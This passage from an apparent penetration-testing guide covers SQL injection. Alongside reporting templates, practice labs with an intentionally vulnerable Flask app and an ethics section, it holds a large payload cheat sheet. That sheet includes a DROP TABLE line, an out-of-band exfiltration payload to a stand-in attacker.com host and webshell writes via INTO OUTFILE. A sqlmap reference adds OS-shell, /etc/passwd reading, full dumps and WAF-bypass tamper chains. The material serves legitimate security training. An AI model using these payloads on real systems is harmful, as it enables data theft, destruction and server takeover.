| Error-based + stacked | Full DB + OS access | 9.8 | Critical |
| Union-based | Data extraction | 8.6 | High |
| Blind boolean | Data extraction (slow) | 7.5 | High |
| Blind time-based | Data extraction (very slow) | 6.5 | Medium-High |
| Second-order | Same as above, delayed | 7.0 | High |
| Out-of-band | Data exfiltration | 7.5 | High |

### Business Impact

- **Data Breach**: Customer data, PII, financial records exposed
- **Authentication Bypass**: Admin access via `' OR '1'='1'`
- **Data Manipulation**: INSERT/UPDATE/DELETE on business data
- **Server Compromise**: OS command execution via xp_cmdshell, UTL_HTTP
- **Lateral Movement**: Database server as pivot to internal network
- **Regulatory**: GDPR, HIPAA, PCI-DSS violations

## Common Pitfalls

1. **Only testing GET parameters**: POST bodies, cookies, headers, and JSON bodies are equally vulnerable.
2. **Ignoring second-order SQLi**: Input stored safely may be used insecurely in different queries.
3. **Trusting WAF protection**: WAFs can be bypassed; always test application-level input validation.
4. **Not testing database-specific syntax**: MySQL, MSSQL, PostgreSQL, and Oracle have different injection syntax.
5. **Missing stacked queries**: Many developers assume stacked queries are not possible; test them.
6. **Forgetting about ORDER BY**: ORDER BY-based injection is often overlooked but exploitable.
7. **Not verifying manually**: Automated tools produce false positives; always verify manually.
8. **Ignoring encoding transformations**: Application-level encoding may transform payloads before they reach the database.
9. **Not testing with different privilege levels**: Injection may behave differently with different database user privileges.
10. **Missing blind injection optimizations**: Binary search and bulk character matching drastically reduce request count.

## Integration Points

### With Recon Phase

```
- Identify database type from technology stack fingerprinting
- Check for database error pages in application responses
- Map all dynamic parameters in the application
- Identify WAF/IPS protecting the target
```

### With Authentication Testing

```
- Test authentication bypass via SQLi
- Extract password hashes from database
- Enumerate admin users for targeted attack
- Test session management queries for injection
```

### With SSRF Hunting

```
- Use SQLi to trigger out-of-band connections
- Extract internal network information via database
- Chain SQLi with SSRF for deeper network access
```

### With RCE Hunting

```
- Use stacked queries for OS command execution (MSSQL xp_cmdshell)
- Use INTO OUTFILE/LOAD DATA INFILE for file write/read
- Chain SQLi with file upload for webshell deployment
```

### With XSS Hunting

```
- Extract session tokens from database via SQLi
- Modify user data to inject XSS payloads
- Use SQLi to bypass XSS filters by modifying filter rules
```

## Reporting Templates

### SQL Injection Report Template

```
## [CRITICAL] SQL Injection — [Injection Type]

**Endpoint**: [METHOD] /path?param=value
**Parameter**: param
**Injection Type**: Error-based / Boolean-blind / Time-blind / Union
**Database**: MySQL / MSSQL / PostgreSQL / Oracle
**CVSS**: [Score] (Critical)

### Description
The application parameter 'param' is vulnerable to SQL injection. An attacker
can modify the intended SQL query to execute arbitrary SQL commands, potentially
extracting sensitive data or compromising the database server.

### Steps to Reproduce
1. Navigate to [URL]
2. Submit the following payload in the 'param' field: [PAYLOAD]
3. Observe [error message / different response / time delay]
4. Extract data using: [sqlmap command]

### Impact
- Full database compromise
- Customer data exfiltration (PII, credentials)
- Potential OS command execution on database server
- Regulatory compliance violation (GDPR/HIPAA/PCI-DSS)

### Remediation
- Use parameterized queries (prepared statements) for all database interactions
- Implement input validation with whitelist approach
- Deploy WAF as defense-in-depth layer
- Apply least-privilege principle to database accounts
- Disable unnecessary database features (xp_cmdshell, UTL_HTTP)
```

## Practice Labs

### SQLi-Labs Setup

```bash
# Clone and setup SQLi-Labs
git clone https://github.com/Audi-1/sqli-labs.git
cd sqli-labs
# Setup with Docker
docker run -d -p 8080:80 acgpiano/sqli-labs
# Access at http://localhost:8080
# Complete all 75 challenges covering all SQLi types
```

### DVWA SQL Injection

```
- Low: Direct string concatenation, no filtering
- Medium: mysql_real_escape_string, addslashes
- High: LIMIT 1 added to query
- Impossible: PDO prepared statements with bound parameters
```

### Custom Practice Environment

```python
# vulnerable_app.py — Flask app with intentional SQLi for practice
from flask import Flask, request, render_template_string
import sqlite3

app = Flask(__name__)

@app.route("/search")
def search():
    query = request.args.get("q", "")
    conn = sqlite3.connect("practice.db")
    # VULNERABLE: Direct string concatenation
    sql = f"SELECT * FROM products WHERE name LIKE '%{query}%'"
    try:
        results = conn.execute(sql).fetchall()
    except Exception as e:
        return f"Error: {e}"
    return render_template_string("<h1>Results</h1>{% for r in results %}<p>{{r}}</p>{% endfor %}", results=results)

if __name__ == "__main__":
    app.run(port=5001, debug=True)
```

## Ethics

- **Authorization**: Only test SQL injection on systems with explicit written permission
- **Data Integrity**: Never modify or delete production data during testing
- **Data Exfiltration**: Minimize data extraction; extract only enough to prove the vulnerability
- **Privilege Escalation**: Document the potential for privilege escalation without actually exploiting it
- **No Backdoors**: Never install persistent backdoors or webshells during authorized testing
- **Responsible Disclosure**: Report SQLi vulnerabilities privately with remediation guidance
- **Legal Awareness**: SQL injection is a criminal offense without authorization under CFAA and similar laws
- **Impact Documentation**: Clearly document the business impact for stakeholder understanding
- **Testing Scope**: Stay within authorized scope; do not test unauthorized databases or systems
- **Clean State**: Ensure testing does not leave the system in a degraded state

## Quick Reference

### SQL Injection Payload Cheat Sheet

```sql
-- Error-based MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- Error-based MSSQL
' AND 1=CONVERT(int,@@VERSION)--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- Boolean-blind MySQL
' AND SUBSTRING(VERSION(),1,1)='5'--
' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>100--
' AND LENGTH((SELECT DATABASE()))>5--

-- Time-based MySQL
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
' AND IF(SUBSTRING(VERSION(),1,1)='5',SLEEP(5),0)--

-- Time-based MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- Time-based PostgreSQL
'; SELECT pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Union-based MySQL
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--

-- Stacked queries
'; SELECT SLEEP(5)--
'; DROP TABLE users;--

-- Out-of-band MySQL
' AND (SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\share')))--
' INTO OUTFILE '/var/www/html/shell.php'--

-- Common extraction queries
SELECT version()                          -- Database version
SELECT database()                         -- Current database
SELECT user()                             -- Current user
SELECT @@datadir                          -- Data directory
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT username,password FROM users        -- Extract credentials
```

### Sqlmap Command Reference

```bash
# Basic scan
sqlmap -u "http://target/page?id=1" --batch

# Enumerate databases
sqlmap -u "http://target/page?id=1" --batch --dbs

# Enumerate tables
sqlmap -u "http://target/page?id=1" --batch -D dbname --tables

# Dump table
sqlmap -u "http://target/page?id=1" --batch -D dbname -T tablename --dump

# POST-based injection
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch

# Cookie injection
sqlmap -u "http://target/page" --cookie="id=1*" --batch

# Header injection
sqlmap -u "http://target/page" --headers="User-Agent: Mozilla*" --batch

# WAF bypass
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between --batch

# Custom tamper
sqlmap -u "http://target/page?id=1" --tamper=custom_tamper.py --batch

# Identify WAF
sqlmap -u "http://target/page?id=1" --identify-waf

# Test all techniques
sqlmap -u "http://target/page?id=1" --technique=BEUST --batch

# OS shell (MSSQL with sa privileges)
sqlmap -u "http://target/page?id=1" --os-shell --batch

# File read
sqlmap -u "http://target/page?id=1" --file-read=/etc/passwd --batch

# File write
sqlmap -u "http://target/page?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php --batch

# Flush session and rescan
sqlmap -u "http://target/page?id=1" --flush-session --batch

# Increase verbosity
sqlmap -u "http://target/page?id=1" -v 3 --batch

# With random User-Agent
sqlmap -u "http://target/page?id=1" --random-agent --batch

# With proxy
sqlmap -u "http://target/page?id=1" --proxy=http://127.0.0.1:8080 --batch

# Level and risk (increase test intensity)
sqlmap -u "http://target/page?id=1" --level=5 --risk=3 --batch
```

### Tamper Script Chains by WAF

```
Cloudflare:  space2comment,between,randomcase,charencode
ModSecurity: between,randomcase,space2comment
Akamai:      charencode,randomcase,space2comment
F5:          space2comment,between,equaltolike
Generic:     between,randomcase,space2comment,charencode
```

### Quick Detection One-Liners

```bash
# Test for SQLi with curl
curl -s "http://target/page?id=1'" | grep -i "sql\|syntax\|error"

# Time-based test
time curl -s "http://target/page?id=1'+AND+SLEEP(5)"

# Boolean test
curl -s "http://target/page?id=1'+AND+'1'='1" | md5sum
curl -s "http://target/page?id=1'+AND+'1'='2" | md5sum

# Quick sqlmap scan
sqlmap -u "http://target/page?id=1" --batch --dbs --level=3 --risk=2

# Extract all data
sqlmap -u "http://target/page?id=1" --batch --dump-all
```

---

**Last Updated**: 2026
**Author**: Advanced Automation Security Framework
**Version**: 2.0
**Tags**: #sql-injection #sqlmap #waf-bypass #blind-sqli #error-based #union-based #automation
